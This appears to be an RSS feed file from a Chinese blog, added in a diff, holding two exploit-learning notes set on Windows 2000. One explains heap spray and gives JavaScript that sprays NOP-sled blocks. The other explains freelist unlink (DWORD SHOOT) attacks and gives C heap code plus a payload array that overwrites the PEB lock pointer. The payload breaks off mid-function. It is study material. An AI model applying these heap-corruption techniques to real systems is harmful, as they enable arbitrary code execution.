@@ -1,0 +1,513 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>堆溢出 on Misaka的秘密花园</title><link>https://blog.moeomu.com/zh-cn/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/</link><description>Recent content in 堆溢出 on Misaka的秘密花园</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 25 Oct 2020 17:56:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/zh-cn/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/index.xml" rel="self" type="application/rss+xml"/><item><title>漏洞利用学习笔记-010-HeapSpray</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/</link><pubDate>Sun, 25 Oct 2020 17:56:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/</guid><description>&lt;p>声明：实验环境为 Windows 2000&lt;/p>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-010-heapspray/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="简介">简介&lt;/h2>
+&lt;blockquote>
+&lt;p>针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>当浏览器或其使用的ActiceX控件中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞&lt;/li>
+&lt;li>不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP&lt;/li>
+&lt;li>有时我们可能很难在浏览器中复杂的内存环境下不知完整的shellcode&lt;/li>
+&lt;li>页面中的JavaScript可以申请堆内存，因此shellcode通过JavaScript布置在堆中称为可能&lt;/li>
+&lt;li>shellcode放在堆中如何定位：HeapSpray&lt;/li>
+&lt;/ul>
+&lt;h2 id="技术细节">技术细节&lt;/h2>
+&lt;ul>
+&lt;li>在使用Heap Spray的时候，一般将EIP指向堆区&lt;code>0x0C0C0C0C&lt;/code>位置，然后用JavaScript申请使用大量堆内存并用包含着&lt;code>0x9&lt;/code>0和shellcode的内存片覆盖这些内存&lt;/li>
+&lt;li>通常，JS会从低地址向高地址分配内存，因此申请的内存超过200MB的话，0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0C0C0C0C，shellcode就可以执行&lt;/li>
+&lt;/ul>
+&lt;h2 id="js代码">JS代码&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-JavaScript" data-lang="JavaScript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unescape&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;%u9090%u9090&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nop&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="c1">//生成一个 1MB 大小充满 0x90 的数据块
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">shellcode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">slide&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Arrary&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">slide&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">shellcode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>解释
+&lt;ul>
+&lt;li>每个内存片大小为1MB&lt;/li>
+&lt;li>首先产生一个大小为1MB而且全部被0x90填满的内存块&lt;/li>
+&lt;li>由于Java会为申请到的内存填上一些额外的信息，为了保证内存片是1MB，要将这些空间减去&lt;/li>
+&lt;li>我们使用200个这样的内存片来覆盖堆内存，只要任意一篇nop区可以覆盖0x0C0C0C0C，就可以成功&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>额外空间&lt;/p>
+&lt;/blockquote>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;/th>
+&lt;th>size&lt;/th>
+&lt;th>说明&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>malloc header&lt;/td>
+&lt;td>32 byte&lt;/td>
+&lt;td>堆块信息&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>string length&lt;/td>
+&lt;td>4 byte&lt;/td>
+&lt;td>表示字符串长度&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>terminator 2&lt;/td>
+&lt;td>1 byte&lt;/td>
+&lt;td>堆块信息&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="实践">实践&lt;/h2>
+&lt;ul>
+&lt;li>未完待续&lt;/li>
+&lt;/ul></description></item><item><title>漏洞利用学习笔记-007-堆溢出的利用</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-007-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/</link><pubDate>Thu, 22 Oct 2020 16:56:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-007-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/</guid><description>&lt;p>声明：实验环境为 Windows 2000&lt;/p>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-007-%e5%a0%86%e6%ba%a2%e5%87%ba%e7%9a%84%e5%88%a9%e7%94%a8/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="链表的拆卸">链表的拆卸&lt;/h2>
+&lt;h3 id="理论">理论&lt;/h3>
+&lt;ul>
+&lt;li>堆块分配：将堆块从空表中“卸下”&lt;/li>
+&lt;li>堆块释放：把堆块链入空表&lt;/li>
+&lt;li>堆块合并：把若干个堆块从空表中“卸下”，修改块首信息(大小)，之后把更新后的新块“链入”空表&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>利用堆溢出：构造数据溢出下一个堆块的块首，改写块首中的前向指针和后向指针，然后在分配释放合并等操作发生时伺机获得依次向内存任意地址写入任意数据的机会&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>这种向任意位置写入任意数据的机会称为&lt;code>DWORD SHOOT/ARBITARY DWORD RESET&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>目标&lt;/th>
+&lt;th>载荷&lt;/th>
+&lt;th>改写后的结果&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>栈帧中的函数返回地址&lt;/td>
+&lt;td>shellcode起始地址&lt;/td>
+&lt;td>函数返回时，执行shellcode&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>栈帧中的S.E.H句柄&lt;/td>
+&lt;td>shellcode起始地址&lt;/td>
+&lt;td>异常发生时，执行shellcode&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>重要函数调用地址&lt;/td>
+&lt;td>shellcode起始地址&lt;/td>
+&lt;td>函数调用时，执行shellcode&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="实践">实践&lt;/h3>
+&lt;h4 id="代码">代码&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h6&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_asm&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="c1">//used to break the process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//free the odd blocks to prevent coalesing
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">HeapFree&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HeapFree&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h3&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HeapFree&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">h5&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//now freelist[2] got 3 entries
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//will allocate from freelist[2] which means unlink the last entry
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//(h5)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="发现">发现&lt;/h4>
+&lt;ul>
+&lt;li>在h1申请到h5空间的时候，如果此时h5已经被溢出覆盖Blink和Flink，那么将会把[Flink]写入[Blink]&lt;/li>
+&lt;/ul>
+&lt;h3 id="代码植入">代码植入&lt;/h3>
+&lt;h4 id="原理">原理&lt;/h4>
+&lt;ul>
+&lt;li>目标对准ExitProcess调用的PEB同步函数指针RtlEnterCriticalSection，在程序内堆溢出引发异常后执行shellcode&lt;/li>
+&lt;/ul>
+&lt;h4 id="代码示例1观察异常">代码示例1(观察异常)&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x16\x01\x1A\x00\x00\x10\x00\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x88\x06\x36\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// ShellCode起始地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\xF0\xFD\x7F&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// PEB同步函数指针位置
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
